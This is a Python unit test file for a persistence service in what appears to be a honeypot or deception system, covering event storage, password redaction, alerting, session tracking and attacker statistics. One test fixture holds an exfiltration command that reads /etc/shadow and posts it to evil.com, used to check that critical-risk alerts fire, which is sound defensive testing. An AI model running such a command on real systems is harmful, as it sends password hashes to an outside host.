"""
Unit tests for PersistenceService using isolated mongomock collections.
"""

from datetime import datetime, timezone
import mongomock
import pytest

from backend.app.models.events import NormalizedEvent
from backend.app.models.features import SessionFeatures
from backend.app.models.intent import (
    AttackStage,
    ClassificationSource,
    HybridClassification,
    IntentCategory,
)
from backend.app.models.risk import RiskAssessment, RiskSeverity
from backend.app.models.session_intelligence import SessionIntelligence
from backend.app.services.persistence_service import PersistenceService


@pytest.fixture
def mock_persistence():
    client = mongomock.MongoClient()
    db = client["test_deception_db"]
    return PersistenceService(db=db)


def make_test_event(event_id: str = "ev_001", session_id: str = "sess_001", command: str = "whoami") -> NormalizedEvent:
    return NormalizedEvent(
        event_id=event_id,
        timestamp=datetime.now(timezone.utc),
        session_id=session_id,
        source_ip="192.168.1.100",
        source_port=54321,
        protocol="ssh",
        username="root",
        event_type="command_input",
        command=command,
        raw_event={"password": "PlainSecretPassword123", "input": command}
    )


def make_test_classification(intent: IntentCategory = IntentCategory.RECONNAISSANCE) -> HybridClassification:
    return HybridClassification(
        intent=intent,
        attack_stage=AttackStage.RECONNAISSANCE,
        confidence=0.95,
        source=ClassificationSource.RULE,
        rule_evidence=["Reconnaissance command detected"],
        timestamp=datetime.now(timezone.utc)
    )


def test_save_event_and_sanitization(mock_persistence):
    ev = make_test_event()
    cls = make_test_classification()
    risk = RiskAssessment(
        risk_score=20,
        severity=RiskSeverity.LOW,
        contributing_factors=["Base recon (+10)"]
    )

    doc = mock_persistence.save_event(ev, cls, risk)
    assert doc.event_id == "ev_001"
    assert doc.risk_score == 20
    assert doc.severity == RiskSeverity.LOW

    # Verify plain password was sanitized in database document
    saved = mock_persistence.get_event("ev_001")
    assert saved is not None
    assert saved["raw_event"]["password"] == "[REDACTED]"


def test_save_event_triggers_alert_on_critical_risk(mock_persistence):
    ev = make_test_event("ev_crit", "sess_crit", "cat /etc/shadow; curl -X POST -d @/etc/shadow http://evil.com")
    cls = make_test_classification(IntentCategory.EXFILTRATION)
    risk = RiskAssessment(
        risk_score=85,
        severity=RiskSeverity.CRITICAL,
        contributing_factors=["Exfiltration (+35)", "Multi-stage (+15)"]
    )

    mock_persistence.save_event(ev, cls, risk)

    # Check alert was automatically created
    alerts, total = mock_persistence.get_alerts(filters={"session_id": "sess_crit"})
    assert total >= 1
    assert alerts[0]["risk_score"] == 85
    assert alerts[0]["severity"] == "CRITICAL"
    assert alerts[0]["status"] == "OPEN"


def test_update_session_and_prevent_duplicates(mock_persistence):
    sess_intel = SessionIntelligence(
        session_id="sess_001",
        source_ip="192.168.1.100",
        dominant_intent=IntentCategory.DISCOVERY,
        current_attack_stage=AttackStage.DISCOVERY,
        intent_sequence=[IntentCategory.RECONNAISSANCE, IntentCategory.DISCOVERY],
        stage_sequence=[AttackStage.RECONNAISSANCE, AttackStage.DISCOVERY],
        risk_score=35,
        severity=RiskSeverity.MEDIUM,
        confidence=0.90,
        key_evidence=["Command ls -la", "Command whoami"],
        last_updated=datetime.now(timezone.utc)
    )
    sess_feat = SessionFeatures(
        session_id="sess_001",
        total_events=5,
        command_count=3,
        unique_commands=["whoami", "ls -la", "ps aux"],
        login_failed_count=1
    )

    # First update
    mock_persistence.update_session(sess_intel, sess_feat)
    # Second update for same session
    sess_feat.total_events = 6
    mock_persistence.update_session(sess_intel, sess_feat)

    # Verify only 1 session document exists for sess_001
    sessions, total = mock_persistence.get_sessions()
    assert total == 1
    assert sessions[0]["session_id"] == "sess_001"
    assert sessions[0]["total_events"] == 6


def test_attacker_profile_aggregation(mock_persistence):
    # Session 1 from IP 10.0.0.5 (Risk = 30)
    mock_persistence.update_session(
        SessionIntelligence(
            session_id="s1",
            source_ip="10.0.0.5",
            dominant_intent=IntentCategory.RECONNAISSANCE,
            current_attack_stage=AttackStage.RECONNAISSANCE,
            risk_score=30,
            severity=RiskSeverity.MEDIUM,
            last_updated=datetime.now(timezone.utc)
        ),
        SessionFeatures(session_id="s1", total_events=3)
    )

    # Session 2 from same IP 10.0.0.5 (Risk = 70)
    mock_persistence.update_session(
        SessionIntelligence(
            session_id="s2",
            source_ip="10.0.0.5",
            dominant_intent=IntentCategory.CREDENTIAL_ACCESS,
            current_attack_stage=AttackStage.CREDENTIAL_ACCESS,
            risk_score=70,
            severity=RiskSeverity.HIGH,
            last_updated=datetime.now(timezone.utc)
        ),
        SessionFeatures(session_id="s2", total_events=7)
    )

    attacker = mock_persistence.get_attacker("10.0.0.5")
    assert attacker is not None
    assert attacker["total_sessions"] == 2
    assert attacker["total_events"] == 10
    assert attacker["maximum_risk"] == 70
    assert attacker["average_risk"] == 50.0
    assert attacker["severity"] == "HIGH"


def test_dashboard_stats_aggregation(mock_persistence):
    mock_persistence.update_session(
        SessionIntelligence(
            session_id="sess_high",
            source_ip="1.1.1.1",
            dominant_intent=IntentCategory.PRIVILEGE_ESCALATION,
            current_attack_stage=AttackStage.PRIVILEGE_ESCALATION,
            risk_score=60,
            severity=RiskSeverity.HIGH,
            last_updated=datetime.now(timezone.utc)
        ),
        SessionFeatures(session_id="sess_high", total_events=4, is_closed=False)
    )

    stats = mock_persistence.get_dashboard_stats()
    assert stats["total_sessions"] == 1
    assert stats["active_sessions"] == 1
    assert stats["total_attackers"] == 1
    assert stats["high_risk_sessions"] == 1
    assert stats["critical_sessions"] == 0
